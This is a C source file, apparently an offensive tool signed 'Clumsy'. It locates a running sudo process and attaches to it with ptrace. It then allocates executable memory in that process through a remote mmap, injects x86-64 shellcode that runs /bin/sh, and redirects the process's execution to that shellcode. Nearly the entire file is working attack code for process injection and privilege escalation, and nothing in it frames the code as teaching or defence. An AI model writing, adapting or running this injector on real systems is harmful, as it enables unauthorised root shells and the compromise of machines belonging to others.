#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>

// =================== SHELLCODE ===================
unsigned char shellcode[] =
"\x48\x31\xd2"                                  // xor    %rdx, %rdx
"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"      // mov $0x68732f6e69622f, %rbx
"\x53"                                          // push   %rbx
"\x48\x89\xe7"                                  // mov    %rsp, %rdi
"\x50"                                          // push   %rax
"\x57"                                          // push   %rdi
"\x48\x89\xe6"                                  // mov    %rsp, %rsi
"\xb0\x3b"                                      // mov    $0x3b, %al
"\x0f\x05";                                     // syscall

// =================== CONSTRUCTOR ===================
__attribute__((constructor)) static void banner_constructor() {
    puts("[Compiled by Clumsy]");
}

// =================== FIND PID ===================
pid_t find_pid_by_name(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR) continue;

        pid_t pid = atoi(entry->d_name);
        if (pid <= 0) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *fp = fopen(path, "r");
        if (fp) {
            char comm[256];
            fgets(comm, sizeof(comm), fp);
            fclose(fp);
            if (strstr(comm, name)) {
                closedir(dir);
                return pid;
            }
        }
    }

    closedir(dir);
    return -1;
}

// =================== REMOTE MMAP ===================
long remote_mmap(pid_t pid, size_t size) {
    printf("[*] Attempting remote mmap of %zu bytes in PID %d...\n", size, pid);

    struct user_regs_struct regs, saved;
    ptrace(PTRACE_GETREGS, pid, NULL, &saved);
    regs = saved;

    regs.rax = SYS_mmap;
    regs.rdi = 0;
    regs.rsi = size;
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
    regs.r10 = MAP_ANONYMOUS | MAP_PRIVATE;
    regs.r8 = -1;
    regs.r9 = 0;
    regs.rip -= 2;

    unsigned long backup = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, 0);
    ptrace(PTRACE_POKETEXT, pid, regs.rip, 0x050f); // syscall opcode

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    void *mapped = (void *)regs.rax;
    printf("[+] Remote mmap successful: allocated address = %p\n", mapped);

    ptrace(PTRACE_POKETEXT, pid, regs.rip, backup);
    ptrace(PTRACE_SETREGS, pid, NULL, &saved);
    return (long)mapped;
}

// =================== SHELLCODE INJECTION ===================
void write_data(pid_t pid, void *addr, void *data, size_t len) {
    printf("[*] Injecting %zu bytes of shellcode into remote process at %p...\n", len, addr);

    size_t i;
    long word;

    for (i = 0; i < len; i += sizeof(word)) {
        memcpy(&word, data + i, sizeof(word));
        ptrace(PTRACE_POKETEXT, pid, addr + i, word);
    }

    printf("[+] Shellcode injection complete.\n");
}

// =================== MAIN ===================
int main() {
    printf("[+] Payload runtime executing \u2014 Made by Clumsy\n");

    pid_t target_pid = find_pid_by_name("sudo");
    if (target_pid < 0) {
        fprintf(stderr, "[-] ERROR: sudo process not found.\n");
        return 1;
    }

    printf("[*] Found target process: sudo (PID: %d)\n", target_pid);

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("[-] ERROR: Failed to attach to target process");
        return 1;
    }

    printf("[+] Attached to PID %d\n", target_pid);
    waitpid(target_pid, NULL, 0);

    long remote_addr = remote_mmap(target_pid, sizeof(shellcode));
    if (remote_addr == -1) {
        fprintf(stderr, "[-] ERROR: Remote mmap failed.\n");
        return 1;
    }

    write_data(target_pid, (void *)remote_addr, shellcode, sizeof(shellcode));

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);

    printf("[*] Original RIP: 0x%llx\n", regs.rip);
    regs.rip = remote_addr;
    printf("[+] Redirecting execution to shellcode at: 0x%llx\n", regs.rip);

    ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    printf("[\u2713] Exploit delivered. Shellcode is now executing in sudo.\n");

    printf("[*] Watching target process output in real-time:\n");
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "strace -p %d -e write 2>&1 | grep -v 'resumed'", target_pid);
    system(cmd);

    return 0;
}
